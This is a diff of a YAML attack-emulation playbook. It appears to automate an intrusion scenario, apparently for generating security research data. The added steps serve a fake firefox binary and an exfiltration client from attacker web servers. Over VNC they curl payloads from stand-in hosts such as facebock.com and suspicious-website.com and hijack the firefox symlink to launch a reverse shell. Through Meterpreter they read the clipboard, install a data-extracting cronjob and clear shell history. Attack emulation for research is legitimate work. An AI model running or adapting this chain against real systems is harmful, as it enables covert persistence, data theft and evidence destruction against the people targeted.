@@ -28,20 +28,23 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
-
-
 ################### SERVE THE FAKE EXECUTABLE ############################
 
   # serve payload via http
   - type: webserv
     local_path: /home/aecid/firefox-startup
+    port: 8083
+    background: True
+
+################### SERVE VEILTRANSFER CLIENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
     port: 8082
     background: True
 
-  - type: sleep
-    seconds: 3
-
-
+################### SERVE THE METERPRETER PAYLOAD ############################
 
   # tempfile for reverse shell payload
   - type: mktemp
@@ -589,9 +592,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# click into the open client terminal on the client screen
-
-
+  # click into the open client terminal on the client screen
   - type: vnc
     cmd: move
     x: 200
@@ -607,8 +608,8 @@ commands:
 
   - type: sleep
     seconds: 5
-# download fake install script
 
+  # download fake install script
   - type: vnc
     cmd: type
     input: "curl -o /tmp/index facebock.com:8080/index"
@@ -625,7 +626,7 @@ commands:
   - type: sleep
     seconds: 10
 
-# make it executable
+  # make it executable
   - type: vnc
     cmd: type
     input: "sudo chmod +x /tmp/index"
@@ -642,7 +643,40 @@ commands:
   - type: sleep
     seconds: 1
 
-#### Persistence OPTION B set up a fake firefox binary that executes the reverse shell and then the actual firefox
+#### Persistence OPTION A set up a fake firefox binary that executes the reverse shell and then the actual firefox
+
+
+  # download the fake executable from attacker webserver
+  - type: vnc
+    cmd: type
+    input: "curl -o /home/judy/.local/share/firefox/firefox-startup 192.42.1.174:8083/index"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  # make it executable
+  - type: vnc
+    cmd: type
+    input: "chmod +x /home/judy/.local/share/firefox/firefox-startup"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
 ## change the symlink in .local/bin from the actual firefox to the fake firefox binary
 
   - type: vnc
@@ -661,39 +695,7 @@ commands:
   - type: sleep
     seconds: 3
 
-## download the fake executable from attacker webserver
-
-  - type: vnc
-    cmd: type
-    input: "curl -o /home/judy/.local/share/firefox/firefox-startup 192.42.1.174:8082/index"
-    session: attacker
-
-  - type: sleep
-    seconds: 1
-
-  - type: vnc
-    cmd: key
-    key: "enter"
-    session: attacker
-
-## make it executable
-  - type: vnc
-    cmd: type
-    input: "chmod +x /home/judy/.local/share/firefox/firefox-startup"
-    session: attacker
-
-  - type: sleep
-    seconds: 1
-
-  - type: vnc
-    cmd: key
-    key: "enter"
-    session: attacker
-
-  - type: sleep
-    seconds: 3
-
-## execute firefox 
+  # execute /tmp/index via the fake firefox executable
   - type: vnc
     cmd: type
     input: "firefox"
@@ -710,26 +712,7 @@ commands:
   - type: sleep
     seconds: 3
 
-## execute the script
-#  - type: vnc
-#    cmd: type
-#    input: "/tmp/index &"
-#    session: attacker
-#    
-#  - type: sleep
-#    seconds: 1
-#
-#  - type: vnc
-#    cmd: key
-#    key: "enter"
-#    session: attacker
-#
-#  - type: sleep
-#    seconds: 3
-#
-
-  - type: debug
-    seconds: execute fake firefox
+################### ATTACKER GATHERS INFORMATION ############################
 
   # run commands via reverse shell
   - type: msf-session
@@ -737,59 +720,84 @@ commands:
     session: revshell
     cmd: sysinfo
 
+  # upload cronjob that extracts data
+  - type: msf-session
+    session: revshell
+    cmd: upload downloader.txt
 
-  # vnc connect to client via tunnel (this is "client is instructed via phone"), take screenshot
+  # get interactive shell
+  - type: msf-session
+    cmd: shell
+    session: revshell
 
-  # open terminal and download rust desk package, make executable, install
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: revshell
 
-  # expect screens that prompt user interaction during install process + enter options (1 and 2, then press any key)
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: revshell
 
-  # set rustdesk password
+  # needed for xclip and wmctrl
+  - type: msf-session
+    cmd: export DISPLAY=:0
+    session: revshell
 
-  # start rustdesk
+################### ATTACKER GATHERS INFORMATION ############################
 
-  # somehow configure via gui to use attacker IP as server ID
+  # download the veiltransfer_client_linux executable
+  - type: msf-session
+    cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
+    session: revshell
 
-  # get client id from rustdesk server log on attacker. regex?
+  # get the last clipboard entry
+  - type: msf-session
+    session: revshell
+    cmd: xclip -selection clipboard -o
+    metadata:
+      techniques: "T1515"
 
-  # via shell command start connection from attacker machine with retrieved id and set password
+  # make the veiltransfer client binary executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
 
-  # vnc connect attacker on its own screen that should now show the clients screen, open terminal, run command to download (facebock.com), make executable and execute install.sh metasploit script
+  # add the cronjob to extract data
+  - type: msf-session
+    session: revshell
+    cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
+    metadata:
+      techniques: "T1029"
 
-  # use established meterpreter session
+  # find out which windown are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
+    metadata:
+      techniques: "T010"
 
-# Meterpreter in a Nutshell
-#  # tempfile for reverse shell payload
-#  - type: mktemp
-#    cmd: file
-#    variable: RSHELL
-#  
-#  # generate reverse shell
-#  - type: shell
-#    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
-#  
-#  # serve payload via http
-#  - type: webserv
-#    local_path: $RSHELL
-#    port: 8080
-#    background: True
-#
-#  # prepare reverse-shell-listener
-#  - type: msf-module
-#    creates_session: revshell
-#    cmd: exploit/multi/handler
-#    payload: $PAYLOAD
-#    payload_options:
-#      LHOST: $ATTACKMATE_IP
-#      LPORT: $LPORT
-#    background: true
-#    kill_on_exit: true
-#
-#  # run commands via reverse shell
-#  - type: msf-session
-#    stdapi: true
-#    session: revshell
-#    cmd: sysinfo
+  # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
+    metadata:
+      techniques: "T1565"
+
+  # exit the interactive shell
+  - type: msf-session
+    session: revshell
+    cmd: exit
+
+
+  
 
 
 
